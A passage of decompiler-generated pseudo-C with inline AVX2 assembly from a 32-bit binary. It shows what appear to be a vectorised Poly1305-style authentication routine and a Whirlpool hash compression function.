  int v271; // [esp+1BCh] [ebp-14h]

  _EDI = a1;
  _ESI = a2;
  result = a1[5];
  v8 = a3 & 0xFFFFFFF0;
  if ( (a3 & 0xFFFFFFF0) != 0 )
  {
    if ( v8 < 0x40 && !result )
      JUMPOUT(0x4D1A50);
    __asm { vzeroupper }
    v271 = 5059125;
    _EBX = dword_4D38C0;
    if ( !result )
    {
      sub_4D2EE0((int)dword_4D38C0, (int)a1);
      v10 = *(_DWORD *)((char *)a1 + 13);
      v11 = (*(_DWORD *)((char *)a1 + 3) >> 2) & 0x3FFFFFF;
      v12 = *(_DWORD *)((char *)a1 + 9) >> 6;
      v13 = (*(_DWORD *)((char *)a1 + 6) >> 4) & 0x3FFFFFF;
      *a1 &= 0x3FFFFFFu;
      a1[1] = v11;
      a1[2] = v13;
      a1[3] = v12;
      a1[4] = v10;
      a1[5] = 1;
      _ESI = a2;
      v8 = a3;
    }
    __asm { vmovdqu xmm0, xmmword ptr [edi+30h] }
    _EDX = &v270;
    __asm
    {
      vmovdqu xmm1, xmmword ptr [edi+40h]
      vmovdqu xmm2, xmmword ptr [edi+50h]
      vmovdqu xmm3, xmmword ptr [edi+60h]
      vmovdqu xmm4, xmmword ptr [edi+70h]
    }
    _EDI = a1 + 12;
    __asm
    {
      vpermq  ymm0, ymm0, 40h ; '@'
      vpermq  ymm1, ymm1, 40h ; '@'
      vpermq  ymm2, ymm2, 40h ; '@'
      vpermq  ymm3, ymm3, 40h ; '@'
      vpermq  ymm4, ymm4, 40h ; '@'
      vpshufd ymm0, ymm0, 0C8h
      vpshufd ymm1, ymm1, 0C8h
      vpshufd ymm2, ymm2, 0C8h
      vpshufd ymm3, ymm3, 0C8h
      vpshufd ymm4, ymm4, 0C8h
      vmovdqa ymmword ptr [edx-80h], ymm0
      vmovdqu xmm0, xmmword ptr [edi+50h]
      vmovdqa ymmword ptr [edx-60h], ymm1
      vmovdqu xmm1, xmmword ptr [edi+60h]
      vmovdqa ymmword ptr [edx-40h], ymm2
      vmovdqu xmm2, xmmword ptr [edi+70h]
      vmovdqa ymmword ptr [edx-20h], ymm3
      vmovdqu xmm3, xmmword ptr [edi+80h]
      vmovdqa ymmword ptr [edx], ymm4
      vpermq  ymm0, ymm0, 40h ; '@'
      vpermq  ymm1, ymm1, 40h ; '@'
      vpermq  ymm2, ymm2, 40h ; '@'
      vpermq  ymm3, ymm3, 40h ; '@'
      vpshufd ymm0, ymm0, 0C8h
      vpshufd ymm1, ymm1, 0C8h
      vpshufd ymm2, ymm2, 0C8h
      vpshufd ymm3, ymm3, 0C8h
      vmovdqa ymmword ptr [edx+20h], ymm0
      vmovd   xmm0, dword ptr [edi-30h]
      vmovdqa ymmword ptr [edx+40h], ymm1
      vmovd   xmm1, dword ptr [edi-2Ch]
      vmovdqa ymmword ptr [edx+60h], ymm2
      vmovd   xmm2, dword ptr [edi-28h]
      vmovdqa ymmword ptr [edx+80h], ymm3
      vmovd   xmm3, dword ptr [edi-24h]
      vmovd   xmm4, dword ptr [edi-20h]
      vmovdqa ymm7, ymmword ptr [ebx+40h]
    }
    result = -a4;
    if ( (v8 & 0x3F) == 0 )
      goto LABEL_12;
    v49 = v8;
    v8 &= 0xFFFFFFC0;
    v50 = v49 & 0x3F;
    __asm { vmovdqu xmm5, xmmword ptr [esi] }
    if ( v50 < 0x20 )
    {
      _ESI += 16;
      __asm { vpxor   ymm6, ymm6, ymm6 }
      _EBX = &dword_4D38C0[-2 * a4 + 8];
    }
    else
    {
      __asm { vmovdqu xmm6, xmmword ptr [esi+10h] }
      if ( v50 == 32 )
      {
        _ESI += 32;
        _EBX = &dword_4D38C0[4];
      }
      else
      {
        __asm { vinserti128 ymm5, ymm5, xmmword ptr [esi+20h], 1 }
        _ESI += 48;
        _EBX = &dword_4D38C0[2];
      }
    }
    while ( 1 )
    {
      __asm
      {
        vmovdqa [esp+1D0h+var_190], ymm2
        vpsrldq ymm2, ymm5, 6
        vmovdqa [esp+1D0h+var_1D0], ymm0
        vpsrldq ymm0, ymm6, 6
        vmovdqa [esp+1D0h+var_1B0], ymm1
        vpunpckhqdq ymm1, ymm5, ymm6
        vpunpcklqdq ymm5, ymm5, ymm6
        vpunpcklqdq ymm2, ymm2, ymm0
        vpsrlq  ymm0, ymm2, 1Eh
        vpsrlq  ymm2, ymm2, 4
        vpsrlq  ymm6, ymm5, 1Ah
        vpsrlq  ymm1, ymm1, 28h ; '('
        vpand   ymm2, ymm2, ymm7
        vpand   ymm5, ymm5, ymm7
        vpand   ymm6, ymm6, ymm7
        vpand   ymm0, ymm0, ymm7
        vpor    ymm1, ymm1, ymmword ptr ds:(loc_4D3235 - 4D3235h)[ebx]
      }
      _EBX = (int *)((unsigned int)_EBX & 0xFFFFFFC0);
      __asm
      {
        vpaddq  ymm2, ymm2, [esp+1D0h+var_190]
        vpaddq  ymm5, ymm5, [esp+1D0h+var_1D0]
        vpaddq  ymm6, ymm6, [esp+1D0h+var_1B0]
        vpaddq  ymm0, ymm0, ymm3
        vpaddq  ymm1, ymm1, ymm4
        vpmuludq ymm3, ymm2, ymmword ptr [edx-5Ch]
        vmovdqa [esp+1D0h+var_1B0], ymm6
        vpmuludq ymm4, ymm2, ymmword ptr [edx-3Ch]
        vmovdqa [esp+1D0h+var_170], ymm0
        vpmuludq ymm0, ymm2, ymmword ptr [edx+64h]
        vmovdqa [esp+1D0h+var_150], ymm1
        vpmuludq ymm1, ymm2, ymmword ptr [edx+84h]
        vpmuludq ymm2, ymm2, ymmword ptr [edx-7Ch]
        vpmuludq ymm7, ymm5, ymmword ptr [edx-1Ch]
        vpaddq  ymm3, ymm3, ymm7
        vpmuludq ymm6, ymm5, ymmword ptr [edx+4]
        vpaddq  ymm4, ymm4, ymm6
        vpmuludq ymm7, ymm5, ymmword ptr [edx-7Ch]
        vpaddq  ymm0, ymm0, ymm7
        vmovdqa ymm7, [esp+1D0h+var_1B0]
        vpmuludq ymm6, ymm5, ymmword ptr [edx-5Ch]
        vpaddq  ymm1, ymm1, ymm6
        vpmuludq ymm5, ymm5, ymmword ptr [edx-3Ch]
        vpaddq  ymm2, ymm2, ymm5
        vpmuludq ymm6, ymm7, ymmword ptr [edx-3Ch]
        vpaddq  ymm3, ymm3, ymm6
        vpmuludq ymm5, ymm7, ymmword ptr [edx-1Ch]
        vpaddq  ymm4, ymm4, ymm5
        vpmuludq ymm6, ymm7, ymmword ptr [edx+84h]
        vpaddq  ymm0, ymm0, ymm6
        vmovdqa ymm6, [esp+1D0h+var_170]
        vpmuludq ymm5, ymm7, ymmword ptr [edx-7Ch]
        vpaddq  ymm1, ymm1, ymm5
        vpmuludq ymm7, ymm7, ymmword ptr [edx-5Ch]
        vpaddq  ymm2, ymm2, ymm7
        vpmuludq ymm5, ymm6, ymmword ptr [edx-7Ch]
        vpaddq  ymm3, ymm3, ymm5
        vpmuludq ymm7, ymm6, ymmword ptr [edx-5Ch]
        vpaddq  ymm4, ymm4, ymm7
        vpmuludq ymm5, ymm6, ymmword ptr [edx+44h]
        vpaddq  ymm0, ymm0, ymm5
        vmovdqa ymm5, [esp+1D0h+var_150]
        vpmuludq ymm7, ymm6, ymmword ptr [edx+64h]
        vpaddq  ymm1, ymm1, ymm7
        vpmuludq ymm6, ymm6, ymmword ptr [edx+84h]
        vpaddq  ymm2, ymm2, ymm6
        vpmuludq ymm7, ymm5, ymmword ptr [edx+84h]
        vpaddq  ymm3, ymm3, ymm7
        vpmuludq ymm6, ymm5, ymmword ptr [edx+24h]
        vpaddq  ymm0, ymm0, ymm6
        vpmuludq ymm7, ymm5, ymmword ptr [edx-7Ch]
        vpaddq  ymm4, ymm4, ymm7
        vmovdqa ymm7, ymmword ptr [ebx+40h]
        vpmuludq ymm6, ymm5, ymmword ptr [edx+44h]
        vpaddq  ymm1, ymm1, ymm6
        vpmuludq ymm5, ymm5, ymmword ptr [edx+64h]
        vpaddq  ymm2, ymm2, ymm5
        vpsrldq ymm5, ymm4, 8
        vpsrldq ymm6, ymm3, 8
        vpaddq  ymm4, ymm4, ymm5
        vpsrldq ymm5, ymm0, 8
        vpaddq  ymm3, ymm3, ymm6
        vpsrldq ymm6, ymm1, 8
        vpaddq  ymm0, ymm0, ymm5
        vpsrldq ymm5, ymm2, 8
        vpaddq  ymm1, ymm1, ymm6
        vpermq  ymm6, ymm4, 2
        vpaddq  ymm2, ymm2, ymm5
        vpermq  ymm5, ymm3, 2
        vpaddq  ymm4, ymm4, ymm6
        vpermq  ymm6, ymm0, 2
        vpaddq  ymm3, ymm3, ymm5
        vpermq  ymm5, ymm1, 2
        vpaddq  ymm0, ymm0, ymm6
        vpermq  ymm6, ymm2, 2
        vpaddq  ymm1, ymm1, ymm5
        vpaddq  ymm2, ymm2, ymm6
        vpsrlq  ymm5, ymm3, 1Ah
        vpand   ymm3, ymm3, ymm7
        vpsrlq  ymm6, ymm0, 1Ah
        vpand   ymm0, ymm0, ymm7
        vpaddq  ymm4, ymm4, ymm5
        vpaddq  ymm1, ymm1, ymm6
        vpsrlq  ymm5, ymm4, 1Ah
        vpand   ymm4, ymm4, ymm7
        vpsrlq  ymm6, ymm1, 1Ah
        vpand   ymm1, ymm1, ymm7
        vpaddq  ymm2, ymm2, ymm6
        vpaddq  ymm0, ymm0, ymm5
        vpsllq  ymm5, ymm5, 2
        vpsrlq  ymm6, ymm2, 1Ah
        vpand   ymm2, ymm2, ymm7
        vpaddq  ymm0, ymm0, ymm5
        vpaddq  ymm3, ymm3, ymm6
        vpsrlq  ymm6, ymm3, 1Ah
        vpsrlq  ymm5, ymm0, 1Ah
        vpand   ymm0, ymm0, ymm7
        vpand   ymm3, ymm3, ymm7
        vpaddq  ymm1, ymm1, ymm5
        vpaddq  ymm4, ymm4, ymm6
      }
      if ( !v8 )
        break;
      __asm
      {
        vpshufd xmm0, xmm0, 0FCh
        vpshufd xmm1, xmm1, 0FCh
        vpshufd xmm2, xmm2, 0FCh
        vpshufd xmm3, xmm3, 0FCh
        vpshufd xmm4, xmm4, 0FCh
      }
LABEL_12:
      __asm
      {
        vmovdqu xmm5, xmmword ptr [esi]
        vmovdqu xmm6, xmmword ptr [esi+10h]
        vinserti128 ymm5, ymm5, xmmword ptr [esi+20h], 1
        vinserti128 ymm6, ymm6, xmmword ptr [esi+30h], 1
      }
      _ESI += 64;
      for ( v8 -= 64; v8; v8 -= 64 )
      {
        __asm
        {
          vmovdqa [esp+1D0h+var_190], ymm2
          vpsrldq ymm2, ymm5, 6
          vmovdqa [esp+1D0h+var_1D0], ymm0
          vpsrldq ymm0, ymm6, 6
          vmovdqa [esp+1D0h+var_1B0], ymm1
          vpunpckhqdq ymm1, ymm5, ymm6
          vpunpcklqdq ymm5, ymm5, ymm6
          vpunpcklqdq ymm2, ymm2, ymm0
          vpsrlq  ymm0, ymm2, 1Eh
          vpsrlq  ymm2, ymm2, 4
          vpsrlq  ymm6, ymm5, 1Ah
          vpsrlq  ymm1, ymm1, 28h ; '('
          vpand   ymm2, ymm2, ymm7
          vpand   ymm5, ymm5, ymm7
          vpand   ymm6, ymm6, ymm7
          vpand   ymm0, ymm0, ymm7
          vpor    ymm1, ymm1, ymmword ptr ds:(loc_4D3235 - 4D3235h)[ebx]
          vpaddq  ymm2, ymm2, [esp+1D0h+var_190]
          vpaddq  ymm5, ymm5, [esp+1D0h+var_1D0]
          vpaddq  ymm6, ymm6, [esp+1D0h+var_1B0]
          vpaddq  ymm0, ymm0, ymm3
          vpaddq  ymm1, ymm1, ymm4
          vpmuludq ymm3, ymm2, ymmword ptr [edx-60h]
          vmovdqa [esp+1D0h+var_1B0], ymm6
          vpmuludq ymm4, ymm2, ymmword ptr [edx-40h]
          vmovdqa [esp+1D0h+var_170], ymm0
          vpmuludq ymm0, ymm2, ymmword ptr [edx+60h]
          vmovdqa [esp+1D0h+var_150], ymm1
          vpmuludq ymm1, ymm2, ymmword ptr [edx+80h]
          vpmuludq ymm2, ymm2, ymmword ptr [edx-80h]
          vpmuludq ymm7, ymm5, ymmword ptr [edx-20h]
          vpaddq  ymm3, ymm3, ymm7
          vpmuludq ymm6, ymm5, ymmword ptr [edx]
          vpaddq  ymm4, ymm4, ymm6
          vpmuludq ymm7, ymm5, ymmword ptr [edx-80h]
          vpaddq  ymm0, ymm0, ymm7
          vmovdqa ymm7, [esp+1D0h+var_1B0]
          vpmuludq ymm6, ymm5, ymmword ptr [edx-60h]
          vpaddq  ymm1, ymm1, ymm6
          vpmuludq ymm5, ymm5, ymmword ptr [edx-40h]
          vpaddq  ymm2, ymm2, ymm5
          vpmuludq ymm6, ymm7, ymmword ptr [edx-40h]
          vpaddq  ymm3, ymm3, ymm6
          vpmuludq ymm5, ymm7, ymmword ptr [edx-20h]
          vpaddq  ymm4, ymm4, ymm5
          vpmuludq ymm6, ymm7, ymmword ptr [edx+80h]
          vpaddq  ymm0, ymm0, ymm6
          vmovdqa ymm6, [esp+1D0h+var_170]
          vpmuludq ymm5, ymm7, ymmword ptr [edx-80h]
          vpaddq  ymm1, ymm1, ymm5
          vpmuludq ymm7, ymm7, ymmword ptr [edx-60h]
          vpaddq  ymm2, ymm2, ymm7
          vpmuludq ymm5, ymm6, ymmword ptr [edx-80h]
          vpaddq  ymm3, ymm3, ymm5
          vpmuludq ymm7, ymm6, ymmword ptr [edx-60h]
          vpaddq  ymm4, ymm4, ymm7
          vpmuludq ymm5, ymm6, ymmword ptr [edx+40h]
          vpaddq  ymm0, ymm0, ymm5
          vmovdqa ymm5, [esp+1D0h+var_150]
          vpmuludq ymm7, ymm6, ymmword ptr [edx+60h]
          vpaddq  ymm1, ymm1, ymm7
          vpmuludq ymm6, ymm6, ymmword ptr [edx+80h]
          vpaddq  ymm2, ymm2, ymm6
          vpmuludq ymm7, ymm5, ymmword ptr [edx+80h]
          vpaddq  ymm3, ymm3, ymm7
          vpmuludq ymm6, ymm5, ymmword ptr [edx+20h]
          vpaddq  ymm0, ymm0, ymm6
          vpmuludq ymm7, ymm5, ymmword ptr [edx-80h]
          vpaddq  ymm4, ymm4, ymm7
          vmovdqa ymm7, ymmword ptr [ebx+40h]
          vpmuludq ymm6, ymm5, ymmword ptr [edx+40h]
          vpaddq  ymm1, ymm1, ymm6
          vpmuludq ymm5, ymm5, ymmword ptr [edx+60h]
          vpaddq  ymm2, ymm2, ymm5
          vpsrlq  ymm5, ymm3, 1Ah
          vpand   ymm3, ymm3, ymm7
          vpsrlq  ymm6, ymm0, 1Ah
          vpand   ymm0, ymm0, ymm7
          vpaddq  ymm4, ymm4, ymm5
          vpaddq  ymm1, ymm1, ymm6
          vpsrlq  ymm5, ymm4, 1Ah
          vpand   ymm4, ymm4, ymm7
          vpsrlq  ymm6, ymm1, 1Ah
          vpand   ymm1, ymm1, ymm7
          vpaddq  ymm2, ymm2, ymm6
          vpaddq  ymm0, ymm0, ymm5
          vpsllq  ymm5, ymm5, 2
          vpsrlq  ymm6, ymm2, 1Ah
          vpand   ymm2, ymm2, ymm7
          vpaddq  ymm0, ymm0, ymm5
          vpaddq  ymm3, ymm3, ymm6
          vpsrlq  ymm6, ymm3, 1Ah
          vpsrlq  ymm5, ymm0, 1Ah
          vpand   ymm0, ymm0, ymm7
          vpand   ymm3, ymm3, ymm7
          vpaddq  ymm1, ymm1, ymm5
          vpaddq  ymm4, ymm4, ymm6
          vmovdqu xmm5, xmmword ptr [esi]
          vmovdqu xmm6, xmmword ptr [esi+10h]
          vinserti128 ymm5, ymm5, xmmword ptr [esi+20h], 1
          vinserti128 ymm6, ymm6, xmmword ptr [esi+30h], 1
        }
        _ESI += 64;
      }
    }
    __asm
    {
      vmovd   dword ptr [edi-30h], xmm0
      vmovd   dword ptr [edi-2Ch], xmm1
      vmovd   dword ptr [edi-28h], xmm2
      vmovd   dword ptr [edi-24h], xmm3
      vmovd   dword ptr [edi-20h], xmm4
      vzeroupper
    }
  }
  return result;
}
// 4D3227: control flows out of bounds to 4D1A50
// 4D3200: unsupported processor register 'ymm0'
// 4D38C0: using guessed type int dword_4D38C0[2];

//----- (004D3980) --------------------------------------------------------
__m64 *__cdecl sub_4D3980(__m64 *a1, __m64 *a2, int a3)
{
  int v3; // edi
  int v4; // esi
  int i; // eax
  char v6; // dl
  int *v7; // eax
  int v8; // edi
  int v9; // edx
  unsigned __int64 v10; // rt0
  int v11; // ecx
  unsigned int v12; // eax
  int v13; // esi
  int v14; // edx
  unsigned int v15; // ebx
  int v16; // ebp
  unsigned __int64 v17; // rt0
  int v18; // ebx
  int v19; // edx
  unsigned int v20; // esi
  int v21; // edi
  int v22; // eax
  int v23; // ecx
  unsigned int v24; // ebp
  unsigned int v25; // ebx
  unsigned __int64 v26; // rt0
  int v27; // ebx
  int v28; // edx
  unsigned int v29; // esi
  int v30; // ecx
  int v31; // edi
  int v32; // eax
  int v33; // ecx
  unsigned __int64 v34; // rt0
  unsigned int v35; // ebx
  unsigned int v36; // ebp
  unsigned int v37; // ecx
  unsigned int v38; // eax
  unsigned int v39; // ecx
  unsigned int v40; // eax
  unsigned int v41; // ecx
  int v42; // eax
  unsigned int v43; // ecx
  int v44; // eax
  unsigned int v45; // ecx
  int v46; // eax
  int v47; // ebx
  int v48; // edx
  unsigned int v49; // esi
  int v50; // edi
  int v51; // ecx
  int v52; // eax
  int v53; // eax
  int v54; // ecx
  unsigned int v55; // ebx
  unsigned int v56; // ebp
  unsigned int v57; // ecx
  int v58; // eax
  unsigned int v59; // ecx
  unsigned int v60; // eax
  unsigned int v61; // ecx
  int v62; // eax
  unsigned int v63; // ecx
  unsigned int v64; // eax
  unsigned int v65; // ecx
  int v66; // eax
  int v67; // ebx
  int v68; // ebp
  int v69; // edx
  unsigned int v70; // esi
  int v71; // edi
  int v72; // eax
  int v73; // ecx
  unsigned int v74; // ebx
  unsigned int v75; // ebp
  unsigned int v76; // ecx
  int v77; // eax
  unsigned int v78; // ecx
  unsigned int v79; // eax
  unsigned int v80; // ecx
  int v81; // eax
  unsigned int v82; // ecx
  unsigned int v83; // eax
  unsigned int v84; // ecx
  int v85; // eax
  int v86; // ebx
  int v87; // ebp
  int v88; // edx
  unsigned int v89; // esi
  int v90; // edi
  int v91; // ecx
  int v92; // eax
  unsigned __int64 v93; // rt0
  unsigned int v94; // ebx
  unsigned int v95; // ebp
  unsigned __int64 v96; // rt0
  unsigned __int64 v97; // rt0
  int v98; // ebx
  int v99; // ebp
  int v100; // edx
  unsigned int v101; // esi
  int v102; // edi
  int v103; // ecx
  int v104; // ecx
  unsigned int v105; // ebx
  unsigned int v106; // ebp
  int v107; // ebx
  unsigned __int64 v108; // rt0
  int v109; // ebp
  int v110; // edx
  unsigned int v111; // esi
  int v112; // edi
  int v113; // eax
  int v114; // ecx
  unsigned int v115; // ebx
  unsigned int v116; // ebp
  unsigned int v117; // ecx
  int v118; // eax
  unsigned int v119; // ecx
  unsigned int v120; // eax
  unsigned int v121; // ecx
  int v122; // eax
  unsigned int v123; // ecx
  unsigned int v124; // eax
  unsigned int v125; // ecx
  int v126; // eax
  int v127; // ebx
  int v128; // ebp
  int v129; // eax
  int v130; // ecx
  int v131; // edx
  int v132; // esi
  int v133; // edi
  int v134; // ebx
  int v135; // esi
  int v136; // ebp
  int v137; // esi
  int v138; // ebp
  int v139; // esi
  int v140; // ebp
  int v141; // esi
  int v142; // ebp
  unsigned __int64 v143; // rt0
  unsigned int v144; // ebx
  int v145; // esi
  unsigned int v146; // edi
  int v147; // ebp
  int v148; // esi
  int v149; // eax
  int v150; // esi
  unsigned int v151; // ebx
  unsigned int v152; // edi
  int v153; // esi
  int v154; // eax
  int v155; // edi
  int v156; // ebx
  bool v157; // cc
  __int8 *v158; // ecx
  __m64 *result; // eax
  int v160; // ebp
  _BYTE *v161; // esi
  char v162; // bl
  char v163; // bl
  char *v164; // esi
  char v165; // bl
  bool v166; // zf
  __int64 v167; // [esp+0h] [ebp-260h]
  int v168; // [esp+10h] [ebp-250h]
  __int64 v169; // [esp+14h] [ebp-24Ch]
  int v170; // [esp+1Ch] [ebp-244h]
  __int64 v171; // [esp+20h] [ebp-240h]
  __int8 *v172; // [esp+28h] [ebp-238h]
  int v173; // [esp+30h] [ebp-230h]
  __int64 v174; // [esp+34h] [ebp-22Ch]
  __int64 v175; // [esp+3Ch] [ebp-224h]
  __int64 v176; // [esp+44h] [ebp-21Ch]
  __int64 v177; // [esp+4Ch] [ebp-214h]
  __int64 v178; // [esp+54h] [ebp-20Ch]
  __int64 v179; // [esp+5Ch] [ebp-204h]
  __int64 v180; // [esp+64h] [ebp-1FCh]
  int v181; // [esp+6Ch] [ebp-1F4h]
  int v182; // [esp+70h] [ebp-1F0h]
  int v183; // [esp+78h] [ebp-1E8h]
  __int64 v184; // [esp+7Ch] [ebp-1E4h]
  int v185; // [esp+84h] [ebp-1DCh]
  int v186; // [esp+88h] [ebp-1D8h]
  int v187; // [esp+8Ch] [ebp-1D4h]
  int v188; // [esp+90h] [ebp-1D0h]
  int v189; // [esp+94h] [ebp-1CCh]
  int v190; // [esp+98h] [ebp-1C8h]
  __int64 v191; // [esp+9Ch] [ebp-1C4h]
  int v192; // [esp+A4h] [ebp-1BCh]
  int v193; // [esp+A8h] [ebp-1B8h]
  int v194; // [esp+B0h] [ebp-1B0h]
  int v195; // [esp+B4h] [ebp-1ACh]
  int v196; // [esp+B8h] [ebp-1A8h]
  __int64 v197; // [esp+BCh] [ebp-1A4h]
  char *v198; // [esp+C4h] [ebp-19Ch]
  __int64 v199; // [esp+C8h] [ebp-198h]
  __int64 v200; // [esp+D0h] [ebp-190h]
  __int64 v201; // [esp+D8h] [ebp-188h]
  __int64 v202; // [esp+E0h] [ebp-180h]
  __int64 v203; // [esp+E8h] [ebp-178h]
  int v204; // [esp+F0h] [ebp-170h]
  int v205; // [esp+F4h] [ebp-16Ch]
  __int64 v206; // [esp+F8h] [ebp-168h]
  __int64 v207; // [esp+100h] [ebp-160h]
  __int64 v208; // [esp+108h] [ebp-158h]
  __int64 v209; // [esp+110h] [ebp-150h]
  unsigned __int64 v210; // [esp+118h] [ebp-148h]
  __int64 v211; // [esp+120h] [ebp-140h]
  __int64 v212; // [esp+128h] [ebp-138h]
  int v213; // [esp+134h] [ebp-12Ch]
  int v214; // [esp+13Ch] [ebp-124h]
  __int64 v215; // [esp+140h] [ebp-120h]
  int v216; // [esp+14Ch] [ebp-114h]
  int v217; // [esp+154h] [ebp-10Ch]
  int v218; // [esp+15Ch] [ebp-104h]
  int v219; // [esp+164h] [ebp-FCh]
  int v220; // [esp+16Ch] [ebp-F4h]
  int v221; // [esp+170h] [ebp-F0h]
  int v222; // [esp+17Ch] [ebp-E4h]
  char *v223; // [esp+184h] [ebp-DCh]
  unsigned __int64 v224; // [esp+188h] [ebp-D8h]
  __m64 *v225; // [esp+194h] [ebp-CCh]
  char *v226; // [esp+198h] [ebp-C8h]
  int v227[16]; // [esp+19Ch] [ebp-C4h] BYREF
  char v228[64]; // [esp+1DCh] [ebp-84h] BYREF
  char v229[64]; // [esp+21Ch] [ebp-44h] BYREF

  v225 = a1;
  if ( (dword_73C6D0 & 0x800000) != 0 )
    return (__m64 *)sub_4D6800(a1, a2, a3);
  v3 = (char *)a1 - v228;
  v223 = (char *)(v229 - (char *)a1);
  v226 = (char *)(&v229[1] - (char *)a1);
  v170 = (char *)a2 - v229;
  v4 = (char *)a2 - v228;
  v172 = &a2->m64_i8[2];
  v168 = (char *)a2 - v228;
  while ( 1 )
  {
    for ( i = 0; i < 64; ++i )
    {
      v6 = v228[i + v3];
      v228[i] = v6;
      v229[i] = v6 ^ v228[i + v4];
    }
    v7 = (int *)&unk_52CDA0;
    v198 = (char *)&unk_52CDA0;
    do
    {
      HIDWORD(v212) = dword_52C5A4[2 * (unsigned __int8)v228[43]];
      LODWORD(v212) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[43]];
      HIDWORD(v174) = dword_52C5A4[2 * (unsigned __int8)v228[36]];
      LODWORD(v174) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[36]];
      HIDWORD(v200) = dword_52C5A4[2 * (unsigned __int8)v228[29]];
      LODWORD(v200) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[29]];
      HIDWORD(v215) = dword_52C5A4[2 * (unsigned __int8)v228[22]];
      v8 = dword_52C5A4[2 * (unsigned __int8)v228[15]];
      v222 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[15]];
      v9 = *v7;
      HIDWORD(v10) = HIDWORD(v215) ^ (__PAIR64__(v8, v222) >> 24);
      LODWORD(v10) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[22]] ^ (v222 << 8);
      LODWORD(v215) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[22]];
      v227[1] = v7[1];
      v11 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[57]];
      v12 = dword_52C5A4[2 * (unsigned __int8)v228[57]];
      v227[0] = v9;
      v13 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[50]];
      v14 = dword_52C5A4[2 * (unsigned __int8)v228[50]];
      HIDWORD(v10) = v14 ^ ((v212 ^ ((v174 ^ ((v200 ^ (v10 << 8)) << 8)) << 8)) >> 24);
      LODWORD(v10) = v13 ^ (((unsigned int)v212 ^ (((unsigned int)v174 ^ (((unsigned int)v200 ^ ((_DWORD)v10 << 8)) << 8)) << 8)) << 8);
      v15 = v12 ^ (v10 >> 24);
      v16 = v11 ^ ((_DWORD)v10 << 8);
      LODWORD(v10) = v13 ^ (__PAIR64__(v12, v11) >> 8);
      HIDWORD(v10) = v14 ^ (v12 >> 8);
      v17 = v215 ^ ((v200 ^ ((v174 ^ ((v212 ^ (v10 >> 8)) >> 8)) >> 8)) >> 8);
      LODWORD(v17) = v222 ^ (v17 >> 8);
      HIDWORD(v17) = v8 ^ (HIDWORD(v17) >> 8);
      v18 = dword_52C5A4[2 * (unsigned __int8)v228[0]] ^ (HIDWORD(v17) >> 8) ^ (__PAIR64__(v15, v16) >> 24);
      v227[0] ^= WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[0]] ^ (v17 >> 8) ^ (v16 << 8);
      v227[1] ^= v18;
      v19 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[1]];
      v20 = dword_52C5A4[2 * (unsigned __int8)v228[1]];
      v21 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[58]];
      v219 = dword_52C5A4[2 * (unsigned __int8)v228[58]];
      LODWORD(v17) = v21 ^ (__PAIR64__(v20, v19) >> 8);
      HIDWORD(v17) = v219 ^ (v20 >> 8);
      HIDWORD(v202) = dword_52C5A4[2 * (unsigned __int8)v228[51]];
      LODWORD(v202) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[51]];
      HIDWORD(v178) = dword_52C5A4[2 * (unsigned __int8)v228[44]];
      LODWORD(v178) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[44]];
      LODWORD(v17) = v178 ^ ((v202 ^ (v17 >> 8)) >> 8);
      HIDWORD(v17) = HIDWORD(v178) ^ ((unsigned int)(HIDWORD(v202) ^ (HIDWORD(v17) >> 8)) >> 8);
      HIDWORD(v207) = dword_52C5A4[2 * (unsigned __int8)v228[37]];
      LODWORD(v207) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[37]];
      HIDWORD(v176) = dword_52C5A4[2 * (unsigned __int8)v228[30]];
      LODWORD(v176) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[30]];
      v22 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[23]];
      v23 = dword_52C5A4[2 * (unsigned __int8)v228[23]];
      LODWORD(v17) = v176 ^ ((v207 ^ (v17 >> 8)) >> 8);
      HIDWORD(v17) = HIDWORD(v176) ^ ((HIDWORD(v207) ^ ((HIDWORD(v178) ^ ((HIDWORD(v202) ^ ((v219 ^ (v20 >> 8)) >> 8)) >> 8)) >> 8)) >> 8);
      v24 = v23 ^ (HIDWORD(v17) >> 8);
      v25 = v22 ^ (v17 >> 8);
      v26 = __PAIR64__(v219, v21) ^ ((v202 ^ ((v178 ^ ((v207 ^ ((v176 ^ (__PAIR64__(v23, v22) << 8)) << 8)) << 8)) << 8)) << 8);
      HIDWORD(v26) = v20 ^ (v26 >> 24);
      LODWORD(v26) = v19 ^ ((_DWORD)v26 << 8);
      v27 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[8]] ^ ((_DWORD)v26 << 8) ^ (__PAIR64__(v24, v25) >> 8);
      v28 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[9]];
      v29 = dword_52C5A4[2 * (unsigned __int8)v228[9]];
      v30 = dword_52C5A4[2 * (unsigned __int8)v228[2]];
      v31 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[2]];
      v227[3] = dword_52C5A4[2 * (unsigned __int8)v228[8]] ^ (v26 >> 24) ^ (v24 >> 8);
      v227[2] = v27;
      v213 = v30;
      LODWORD(v26) = v31 ^ (__PAIR64__(v29, v28) >> 8);
      HIDWORD(v26) = v30 ^ (v29 >> 8);
      v205 = dword_52C5A4[2 * (unsigned __int8)v228[59]];
      v204 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[59]];
      v183 = dword_52C5A4[2 * (unsigned __int8)v228[52]];
      LODWORD(v209) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[45]];
      HIDWORD(v209) = dword_52C5A4[2 * (unsigned __int8)v228[45]];
      LODWORD(v180) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[38]];
